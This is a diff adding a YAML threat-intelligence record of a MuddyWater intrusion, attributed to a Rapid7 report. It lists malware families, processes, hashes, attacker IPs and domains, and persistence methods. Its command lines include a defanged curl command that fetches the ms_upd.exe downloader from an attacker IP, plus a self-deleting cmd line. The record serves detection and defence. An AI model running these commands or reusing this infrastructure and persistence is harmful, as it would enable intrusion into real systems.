@@ -1,0 +1,101 @@
+title: Intrusion Assessment Linked to MuddyWater (Seedworm) APT
+description: This report details the MuddyWater campaign targeting organizations in
+  the U.S. and Middle East using a downloader named ms_upd.exe and backdoor Game.exe.
+attribution: MuddyWater (Seedworm)
+malware_families:
+- Game.exe
+- Stagecomp
+- Darkcomp
+cves: []
+ttps:
+  processes:
+  - dwagent.exe
+  - pythonw.exe
+  - dwagsvc.exe
+  - dwaglnc.exe
+  - ms_upd.exe
+  - Game.exe
+  - AnyDesk.exe
+  command_lines:
+  - ipconfig /all
+  - nslookup
+  - net start
+  - whoami
+  - ping
+  - curl hxxp[://]172.86.126[.]208:443/ms_upd.exe -o C:\ProgramData\ms_upd.exe
+  - ms_upd.exe
+  - cmd.exe /c ping 127.0.0.1 -n 6 > nul && del /f /q \"%s\"
+  powershell: []
+  scripts: []
+  registry_keys: []
+  image_loads:
+  - WebView2Loader.dll
+  network_connections:
+  - ms_upd.exe -> moonzonet[.]com:443
+  - Game.exe -> uploadfiler[.]com:443
+  - ms_upd.exe -> moonzonet[.]com:80
+  - pythonw.exe -> 77.110.107[.]235:443
+  - renamed pythonw.exe -> 93.123.39[.]127:443
+  - ms_upd.exe -> 172.86.126[.]208:80
+  - renamed pythonw.exe -> 116.203.208[.]186:80
+  - Chaos RaaS DLS -> hptqq2o2qjva7lcaaq67w36jihzivkaitkexorauw7b2yul2z6zozpqd[.]onion:443
+  - Game.exe -> adm-pulse[.]com:80
+  - Game.exe -> moonzonet[.]com:80
+  - Game.exe -> uploadfiler[.]com:80
+  - Game.exe -> 77.110.107[.]235:80
+  - Game.exe -> 93.123.39[.]127:80
+  - Game.exe -> 172.86.126[.]208:80
+  - Game.exe -> 116.203.208[.]186:80
+  - Game.exe -> hptqq2o2qjva7lcaaq67w36jihzivkaitkexorauw7b2yul2z6zozpqd[.]onion:80
+  file_activity:
+  - C:\ProgramData\ms_upd.exe
+  - C:\Users\pc\Downloads\WebView2Samples-main\WebView2Samples-main\SampleApps\WebView2APISample\Release\x64\WebView2APISample.pdb
+  - ms_upd.exe
+  - DIDS.exe
+  - Game.exe
+  - WebView2.exe
+  - visualwincomp.txt
+  - WebView2Loader.dll
+  - dwagent.exe
+  - dwagsvc.exe
+  - dwaglnc.exe
+  - AnyDesk.exe
+  persistence:
+  - Registry Run key (HKCU) pointing to C:\ProgramData\ms_upd.exe
+  - Mutex ATTRIBUTES_ObjectKernel
+  - Installation of DWAgent as a service
+  - Installation of DWAgent as a service (dwagsvc.exe)
+  - Background and system tray binary of DWService (dwaglnc.exe)
+  process_relations: []
+iocs:
+  hashes:
+  - a47cd0dc12f0152d8f05b79e5c86bac9231f621db7b0e90a32f87b98b4e82f3a
+  - 1319d474d19eb386841732c728acf0c5fe64aa135101c6ceee1bd0369ecf97b6
+  - c86ab27100f2a2939ac0d4a8af511f0a1a8116ba856100aae03bc2ad6cb0f1e0
+  - 24857fe82f454719cd18bcbe19b0cfa5387bee1022008b7f5f3a8be9f05e4d14
+  - a92d28f1d32e3a9ab7c3691f8bfca8f7586bb0666adbba47eab3e1a8faf7ecc0
+  - 3df9dcc45d2a3b1f639e40d47eceeafb229f6d9e7f0adcd8f1731af1563ffb90
+  - cd098eddb23f2d2f6c42271ca82803b0d5ac950cb82a9b8ae0928e83945a53df
+  - cf3dfd1d6626fd2129abb7a5983c11827f4b0d497e2dba146a1889bd71f23cd5
+  - a3bac548b5bc91c526b4d6707623ddbd1a675aa952f0d1f9a0aa6f7230f09f23
+  - 86e0197389f0573eb83ff53991f337d416124c7c8bd727721ef3d396cd5f65dc
+  - bfc1675ee1e358db8356f515aaded7962923e426aa0a0a1c0eddfc4dab053f89
+  ip_addresses:
+  - 172.86.126[.]208
+  - 77.110.107[.]235
+  - 93.123.39[.]127
+  - 116.203.208[.]186
+  domains:
+  - moonzonet[.]com
+  - uploadfiler[.]com
+  - hptqq2o2qjva7lcaaq67w36jihzivkaitkexorauw7b2yul2z6zozpqd[.]onion
+  - adm-pulse[.]com
+  urls:
+  - hxxp[://]172.86.126[.]208:443/ms_upd.exe
+authors:
+- Rapid7
+- Craig Adams
+- Donald Gay
+reference: https://www.rapid7.com/blog/post/tr-muddying-tracks-state-sponsored-shadow-behind-chaos-ransomware
+date_of_publication: May 06, 2026
+file_creation_date: May 09, 2026
